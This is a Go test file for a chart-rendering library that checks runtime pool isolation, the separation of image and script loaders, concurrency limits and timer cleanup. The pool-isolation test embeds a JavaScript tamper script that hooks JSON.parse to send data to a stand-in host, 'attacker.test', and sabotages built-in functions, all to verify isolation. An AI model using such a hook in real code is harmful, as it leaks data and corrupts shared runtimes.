// Copyright (c) 2026, Gravwell, Inc.
// All rights reserved.
//
// Use of this source code is governed by a BSD 2-Clause license that can be
// found in the LICENSE file.

package goecharts

import (
	"context"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// A script must not be able to affect a later render: the runtime it ran on
// is not reused, whether the script succeeded or failed.
func TestScriptDoesNotTaintPool(t *testing.T) {
	var loads atomic.Int32
	loader := LoaderFunc(func(ctx context.Context, url string) ([]byte, error) {
		loads.Add(1)
		return []byte("{}"), nil
	})
	r, err := New(WithLoader(loader), WithPoolSize(1), WithMaxConcurrency(1))
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	// Warm the pool so the scripts below run on the one pooled runtime.
	if _, err := r.RenderSVG(ctx, []byte(barOption), salesData()); err != nil {
		t.Fatal(err)
	}
	const tamper = `
JSON.parse = (function (orig) {
  return function (s) { __goecharts_host.load('https://attacker.test/?d=' + s.length); return orig(s); };
})(JSON.parse);
Array.prototype.map = function () { throw new Error('tampered map'); };
echarts.init = function () { throw new Error('tampered init'); };
__goecharts_timers.run = function () { throw new Error('tampered timers'); };
`
	scripts := map[string]string{
		"succeeds": `option = {title: {text: 'x'}};` + tamper,
		"fails":    tamper + `throw new Error('boom');`,
	}
	for name, script := range scripts {
		_, _ = r.Render(ctx, Request{Script: []byte(script)})
		loads.Store(0)
		svg, err := r.RenderSVG(ctx, []byte(barOption), salesData())
		if err != nil {
			t.Fatalf("%s: option render after script: %v", name, err)
		}
		if !strings.Contains(string(svg), "<svg") {
			t.Fatalf("%s: no SVG after script", name)
		}
		if n := loads.Load(); n != 0 {
			t.Fatalf("%s: option render made %d loads through the script's hook", name, n)
		}
	}
}

// A plain option reaches no loader for an image unless WithImageLoader is
// set, and never reaches the script Loader.
func TestOptionImageLoading(t *testing.T) {
	const option = `{"xAxis":{"type":"category","data":["a"]},"yAxis":{},
		"series":[{"type":"bar","data":[1],
		"itemStyle":{"color":{"image":"https://img.test/p.png","repeat":"repeat"}}}]}`
	var scriptLoads, imageLoads atomic.Int32
	scriptLoader := LoaderFunc(func(ctx context.Context, url string) ([]byte, error) {
		scriptLoads.Add(1)
		return nil, context.Canceled
	})
	imageLoader := LoaderFunc(func(ctx context.Context, url string) ([]byte, error) {
		imageLoads.Add(1)
		return nil, context.Canceled
	})
	ctx := context.Background()

	r, err := New(WithLoader(scriptLoader))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := r.RenderSVG(ctx, []byte(option), nil); err != nil {
		t.Fatal(err)
	}
	if n := scriptLoads.Load(); n != 0 {
		t.Fatalf("option reached the script Loader %d times", n)
	}

	r, err = New(WithLoader(scriptLoader), WithImageLoader(imageLoader))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := r.RenderSVG(ctx, []byte(option), nil); err != nil {
		t.Fatal(err)
	}
	if scriptLoads.Load() != 0 || imageLoads.Load() == 0 {
		t.Fatalf("script loads %d, image loads %d; want 0 and at least 1", scriptLoads.Load(), imageLoads.Load())
	}
}

// No more than WithMaxConcurrency renders run at once, and a waiting render
// gives up when its context ends.
func TestMaxConcurrency(t *testing.T) {
	var running, peak atomic.Int32
	release := make(chan struct{})
	loader := LoaderFunc(func(ctx context.Context, url string) ([]byte, error) {
		n := running.Add(1)
		for {
			p := peak.Load()
			if n <= p || peak.CompareAndSwap(p, n) {
				break
			}
		}
		<-release
		running.Add(-1)
		return []byte("{}"), nil
	})
	r, err := New(WithLoader(loader), WithMaxConcurrency(2))
	if err != nil {
		t.Fatal(err)
	}
	script := []byte(`$.get('/x'); option = {title: {text: 'x'}};`)
	var wg sync.WaitGroup
	for range 6 {
		wg.Go(func() {
			if _, err := r.Render(context.Background(), Request{Script: script}); err != nil {
				t.Error(err)
			}
		})
	}
	// Wait until both slots are held inside the loader.
	for deadline := time.Now().Add(10 * time.Second); running.Load() < 2; {
		if time.Now().After(deadline) {
			t.Fatal("renders did not start")
		}
		time.Sleep(time.Millisecond)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Millisecond)
	defer cancel()
	if _, err := r.Render(ctx, Request{Script: script}); err != context.DeadlineExceeded {
		t.Errorf("queued render: got %v, want deadline exceeded", err)
	}
	close(release)
	wg.Wait()
	if p := peak.Load(); p != 2 {
		t.Errorf("peak concurrency %d, want 2", p)
	}
}

// Timers queued during a plain option render do not stay on the runtime.
func TestOptionRenderClearsTimers(t *testing.T) {
	r, err := New()
	if err != nil {
		t.Fatal(err)
	}
	rt, err := newJSRuntime(r)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := rt.vm.RunString(`setTimeout(function () { globalThis.fired = true; }, 0);`); err != nil {
		t.Fatal(err)
	}
	if _, err := rt.render(context.Background(), barOption, "", ""); err != nil {
		t.Fatal(err)
	}
	v, err := rt.vm.RunString(`__goecharts_timers.run(10); !!globalThis.fired`)
	if err != nil {
		t.Fatal(err)
	}
	if v.ToBoolean() {
		t.Error("a timer survived an option render")
	}
}
